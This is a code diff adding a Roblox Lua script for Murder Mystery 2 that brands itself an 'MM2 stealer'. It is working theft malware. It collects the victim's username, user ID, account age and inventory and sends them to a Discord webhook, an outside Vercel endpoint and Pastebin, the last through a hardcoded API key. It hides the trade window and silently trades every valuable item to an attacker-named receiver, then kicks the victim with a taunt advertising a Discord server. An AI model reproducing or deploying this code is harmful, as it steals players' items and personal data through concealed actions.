+        local chromaExtractedValues = {}
+        local categoriesToFetch = {}
+
+        for rarity, url in pairs(categories) do
+            table.insert(categoriesToFetch, {rarity = rarity, url = url})
+        end
+
+        local totalCategories = #categoriesToFetch
+        local completed = 0
+        local lock = Instance.new("BindableEvent")
+
+        for _, category in ipairs(categoriesToFetch) do
+            task.spawn(
+                function()
+                    local rarity = category.rarity
+                    local url = category.url
+                    local htmlContent = fetchHTML(url)
+
+                    if htmlContent and htmlContent ~= "" then
+                        if rarity ~= "chroma" then
+                            local extractedItemValues = extractItems(htmlContent)
+                            for itemName, value in pairs(extractedItemValues) do
+                                allExtractedValues[itemName] = value
+                            end
+                        else
+                            chromaExtractedValues = extractChromaItems(htmlContent)
+                        end
+                    end
+
+                    completed = completed + 1
+                    if completed == totalCategories then
+                        lock:Fire()
+                    end
+                end
+            )
+        end
+
+        lock.Event:Wait()
+
+        local valueList = {}
+
+        for dataid, item in pairs(database) do
+            local itemName = item.ItemName and item.ItemName:lower() or ""
+            local rarity = item.Rarity or ""
+            local hasChroma = item.Chroma or false
+
+            if itemName ~= "" and rarity ~= "" then
+                local weaponRarityIndex = table.find(rarityTable, rarity)
+                local godlyIndex = table.find(rarityTable, "Godly")
+
+                if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                    if hasChroma then
+                        local matchedChromaValue = nil
+                        for chromaName, value in pairs(chromaExtractedValues) do
+                            if chromaName:find(itemName) then
+                                matchedChromaValue = value
+                                break
+                            end
+                        end
+
+                        if matchedChromaValue then
+                            valueList[dataid] = matchedChromaValue
+                        end
+                    else
+                        local value = allExtractedValues[itemName]
+                        if value then
+                            valueList[dataid] = value
+                        end
+                    end
+                end
+            end
+        end
+
+        return valueList
+    end
+
+    local function sendTradeRequest(user)
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild(user)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(
+            unpack(args)
+        )
+    end
+
+    local function getTradeStatus()
+        return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    end
+
+    local function waitForTradeCompletion()
+        while true do
+            local status = getTradeStatus()
+            if status == "None" then
+                break
+            end
+            wait(0.1)
+        end
+    end
+
+    local function acceptTrade()
+        local args = {
+            [1] = 285646582
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+    end
+
+    local function addWeaponToTrade(id)
+        local args = {
+            [1] = id,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+    end
+
+    local totalValue = 0
+
+    local function SendJoinMessage(rawUrl)
+        local fields = {
+            {
+                name = ":star: __**Mori Scripts**__",
+                value = "```Username     : " ..
+                    fardplayer.Name ..
+                        "\nUser-ID      : " ..
+                            fardplayer.userId ..
+                                "\nAccount Age  : " ..
+                                    fardplayer.AccountAge ..
+                                        " Days" ..
+                                            "\nExploit      : " ..
+                                                ExecutorWebhook .. "\nReceiver     : " .. Username .. "```",
+                inline = false
+            },
+            {
+                name = ":ringed_planet: __/__ **`Inventory:`**",
+                value = "```Total Value \240\159\147\154 : " ..
+                    totalValue ..
+                        "\n\nUnique      \240\159\141\132 : " ..
+                            uniqueItemsC ..
+                                "\nAncient     \240\159\140\191 : " ..
+                                    ancientItemsC ..
+                                        "\nGodly       \240\159\146\142 : " ..
+                                            godlyItemsC ..
+                                                "\nLegendary   \226\154\161 : " ..
+                                                    legendaryItemsC ..
+                                                        "\nVintage     \240\159\167\138 : " ..
+                                                            vintageItemsC ..
+                                                                "\nRare        \240\159\140\136 : " ..
+                                                                    rareItemsC ..
+                                                                        "\nHalloween   \240\159\142\131 : " ..
+                                                                            HalloweenItemsC ..
+                                                                                "\nChristmas   \240\159\142\132 : " ..
+                                                                                    ChristmasItemsC ..
+                                                                                        "\nUncommon    \240\159\140\184 : " ..
+                                                                                            uncommonItemsC ..
+                                                                                                "\nCommon      \240\159\147\166 : " ..
+                                                                                                    commonItemsC ..
+                                                                                                        "```",
+                inline = false
+            },
+            {
+                name = "Hits List:",
+                value = rawUrl,
+                inline = false
+            }
+        }
+
+        local data = {
+            ["content"] = "--@everyone\n" ..
+                [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] ..
+                    game.PlaceId .. [[, "]] .. game.JobId .. [[")]],
+            ["username"] = fardplayer.Name,
+            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
+            ["embeds"] = {
+                {
+                    ["color"] = null,
+                    ["fields"] = fields
+                }
+            }
+        }
+
+        local body = HttpService:JSONEncode(data)
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        local response =
+            request(
+            {
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            }
+        )
+    end
+
+    local function GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
+        local fields = {
+            {
+                name = "Victim Username:",
+                value = "Username is hidden\nCountry: " .. countryFlagEmoji,
+                inline = false
+            },
+            {
+                name = "Inventory Information:",
+                value = "",
+                inline = false
+            },
+            {
+                name = "Summary:",
+                value = "Total Value: " .. totalValue .. "\nInventory Link: " .. rawUrl,
+                inline = false
+            }
+        }
+
+        fields[2].value = fields[2].value .. "```" .. List2 .. "```"
+
+        if #fields[2].value > 1024 then
+            local lines = {}
+            for line in fields[2].value:gmatch("[^\r\n]+") do
+                table.insert(lines, line)
+            end
+
+            while #fields[2].value > 1024 and #lines > 0 do
+                table.remove(lines)
+                fields[2].value = table.concat(lines, "\n") .. "\nand more!```"
+            end
+        end
+
+        local data2 = {
+            ["username"] = "Mori Scripts Global Hit",
+            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
+            ["embeds"] = {
+                {
+                    ["title"] = ":knife: New MM2 Execution",
+                    ["color"] = 65280,
+                    ["fields"] = fields,
+                    ["footer"] = {
+                        ["text"] = "MM2 stealer by Mooze. discord.gg/PzWY2QX8cu"
+                    }
+                }
+            }
+        }
+
+        local body = HttpService:JSONEncode(data2)
+
+        local headers = {
+            ["Content-Type"] = "application/json",
+            ["DiscUser"] = discuser
+        }
+
+        local response =
+            request(
+            {
+                Url = "https://webhook-taupe-eta.vercel.app/safehook",
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            }
+        )
+    end
+
+    local tradegui = playerGui:WaitForChild("TradeGUI")
+    tradegui:GetPropertyChangedSignal("Enabled"):Connect(
+        function()
+            tradegui.Enabled = false
+        end
+    )
+    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(
+        function()
+            tradeguiphone.Enabled = false
+        end
+    )
+
+    local untradable = {
+        ["DefaultGun"] = true,
+        ["DefaultKnife"] = true,
+        ["Reaver"] = true,
+        ["Reaver_Legendary"] = true,
+        ["Reaver_Godly"] = true,
+        ["Reaver_Ancient"] = true,
+        ["IceHammer"] = true,
+        ["IceHammer_Legendary"] = true,
+        ["IceHammer_Godly"] = true,
+        ["IceHammer_Ancient"] = true,
+        ["Gingerscythe"] = true,
+        ["Gingerscythe_Legendary"] = true,
+        ["Gingerscythe_Godly"] = true,
+        ["Gingerscythe_Ancient"] = true,
+        ["TestItem"] = true,
+        ["Season1TestKnife"] = true,
+        ["Cracks"] = true,
+        ["Icecrusher"] = true,
+        ["???"] = true,
+        ["Dartbringer"] = true,
+        ["TravelerAxeRed"] = true,
+        ["TravelerAxeBronze"] = true,
+        ["TravelerAxeSilver"] = true,
+        ["TravelerAxeGold"] = true,
+        ["BlueCamo_K_2022"] = true,
+        ["GreenCamo_K_2022"] = true,
+        ["SharkSeeker"] = true
+    }
+
+    local valueList = buildValueList()
+    local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+    for i, v in pairs(realData.Weapons.Owned) do
+        local dataid = i
+        local amount = v
+        local rarity = database[dataid].Rarity
+        local weapon_rarity_index = table.find(rarityTable, rarity)
+        if amount > 0 and not untradable[dataid] then
+            local value
+            if valueList[dataid] then
+                value = valueList[dataid]
+            else
+                if weapon_rarity_index >= table.find(rarityTable, "Godly") then
+                    value = 2
+                else
+                    value = 0
+                end
+            end
+            totalValue = totalValue + (value * amount)
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = (value * amount)})
+        end
+    end
+
+    for _, item in ipairs(weaponsToSend) do
+        if item.Rarity == "Vintage" then
+            VintageList = VintageList .. item.DataID .. " x" .. item.Amount .. "\n"
+            vintageItemsC = vintageItemsC + item.Amount
+        elseif item.Rarity == "Unique" then
+            UniqueList = UniqueList .. item.DataID .. " x" .. item.Amount .. "\n"
+            uniqueItemsC = uniqueItemsC + item.Amount
+        elseif item.Rarity == "Ancient" then
+            AncientList = AncientList .. item.DataID .. " x" .. item.Amount .. "\n"
+            ancientItemsC = ancientItemsC + item.Amount
+        elseif item.Rarity == "Godly" then
+            GodlyList = GodlyList .. item.DataID .. " x" .. item.Amount .. "\n"
+            godlyItemsC = godlyItemsC + item.Amount
+        elseif item.Rarity == "Legendary" then
+            LegendaryList = LegendaryList .. item.DataID .. " x" .. item.Amount .. "\n"
+            legendaryItemsC = legendaryItemsC + item.Amount
+        elseif item.Rarity == "Halloween" then
+            HalloweenList = HalloweenList .. item.DataID .. " x" .. item.Amount .. "\n"
+            HalloweenItemsC = HalloweenItemsC + item.Amount
+        elseif item.Rarity == "Christmas" then
+            ChristmasList = ChristmasList .. item.DataID .. " x" .. item.Amount .. "\n"
+            ChristmasItemsC = ChristmasItemsC + item.Amount
+        elseif item.Rarity == "Rare" then
+            RareList = RareList .. item.DataID .. " x" .. item.Amount .. "\n"
+            rareItemsC = rareItemsC + item.Amount
+        elseif item.Rarity == "Uncommon" then
+            UncommonList = UncommonList .. item.DataID .. " x" .. item.Amount .. "\n"
+            uncommonItemsC = uncommonItemsC + item.Amount
+        elseif item.Rarity == "Common" then
+            CommonList = CommonList .. item.DataID .. " x" .. item.Amount .. "\n"
+            commonItemsC = commonItemsC + item.Amount
+        end
+        List2 = List2 .. item.DataID .. " (x" .. item.Amount .. "): " .. item.Value .. " Value\n"
+    end
+
+    task.wait(0.1)
+
+    if VintageList ~= "" then
+        List = List .. "VINTAGE LIST:\n" .. VintageList .. "\n"
+    end
+    if UniqueList ~= "" then
+        List = List .. "UNIQUE LIST:\n" .. UniqueList .. "\n"
+    end
+    if AncientList ~= "" then
+        List = List .. "ANCIENT LIST:\n" .. AncientList .. "\n"
+    end
+    if GodlyList ~= "" then
+        List = List .. "GODLY LIST:\n" .. GodlyList .. "\n"
+    end
+    if LegendaryList ~= "" then
+        List = List .. "LEGENDARY LIST:\n" .. LegendaryList .. "\n"
+    end
+    if HalloweenList ~= "" then
+        List = List .. "HALLOWEEN LIST:\n" .. HalloweenList .. "\n"
+    end
+    if ChristmasList ~= "" then
+        List = List .. "CHRISTMAS LIST:\n" .. ChristmasList .. "\n"
+    end
+    if RareList ~= "" then
+        List = List .. "RARE LIST:\n" .. RareList .. "\n"
+    end
+    if UncommonList ~= "" then
+        List = List .. "UNCOMMON LIST:\n" .. UncommonList .. "\n"
+    end
+    if CommonList ~= "" then
+        List = List .. "COMMON LIST:\n" .. CommonList .. "\n"
+    end
+
+    if #weaponsToSend > 0 then
+        table.sort(
+            weaponsToSend,
+            function(a, b)
+                return a.Value > b.Value
+            end
+        )
+
+        local sentWeapons = {}
+        for i, v in ipairs(weaponsToSend) do
+            sentWeapons[i] = v
+        end
+
+        local body = {
+            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+            api_paste_code = "MM2 STEALER BY MOOZE, JOIN discord.gg/PzWY2QX8cu\n\n" .. List,
+            api_option = "paste"
+        }
+
+        local encodedBody = ""
+        for key, value in pairs(body) do
+            encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+        end
+        encodedBody = encodedBody:sub(1, -2)
+
+        local response
+        local success, err =
+            pcall(
+            function()
+                response =
+                    request(
+                    {
+                        Url = "https://pastebin.com/api/api_post.php",
+                        Method = "POST",
+                        Body = encodedBody,
+                        Headers = {
+                            ["Content-Type"] = "application/x-www-form-urlencoded"
+                        },
+                        Timeout = 20
+                    }
+                )
+            end
+        )
+
+        local rawUrl
+        if not success or not response or not response.Success then
+            rawUrl = "Ratelimited"
+        else
+            local pasteUrl = response.Body
+            rawUrl = "[Click Me](https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$") .. ")"
+        end
+
+        SendJoinMessage(rawUrl)
+        GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
+
+        local function doTrade(joinedUser)
+            local initialTradeState = getTradeStatus()
+            if initialTradeState == "StartTrade" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+                wait(0.3)
+            elseif initialTradeState == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                wait(0.3)
+            end
+
+            while #weaponsToSend > 0 do
+                local tradeStatus = getTradeStatus()
+
+                if tradeStatus == "None" then
+                    sendTradeRequest(joinedUser)
+                elseif tradeStatus == "SendingRequest" then
+                    wait(0.3)
+                elseif tradeStatus == "ReceivingRequest" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer(
+
+                    )
+                    wait(0.3)
+                elseif tradeStatus == "StartTrade" then
+                    for i = 1, math.min(4, #weaponsToSend) do
+                        local weapon = table.remove(weaponsToSend, 1)
+                        for count = 1, weapon.Amount do
+                            addWeaponToTrade(weapon.DataID)
+                        end
+                    end
+                    wait(6)
+                    acceptTrade()
+                    waitForTradeCompletion()
+                else
+                    wait(0.5)
+                end
+                wait(1)
+            end
+            plr:kick(
+                "All your stuff has just been stolen by Mori Scripts Tradestealer. Join discord.gg/PzWY2QX8cu to start tradestealing yourself"
+            )
+        end
+
+        local function waitForUserChat()
+            local sentMessage = false
+            local function onPlayerChat(player)
+                if user == player.Name then
+                    player.Chatted:Connect(
+                        function()
+                            doTrade(player.Name)
+                        end
+                    )
+                end
+            end
+            for _, p in ipairs(Players:GetPlayers()) do
+                onPlayerChat(p)
+            end
+            Players.PlayerAdded:Connect(onPlayerChat)
+        end
+        waitForUserChat()
+    end
+end
+
+if game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 then
+    MM2()
+end
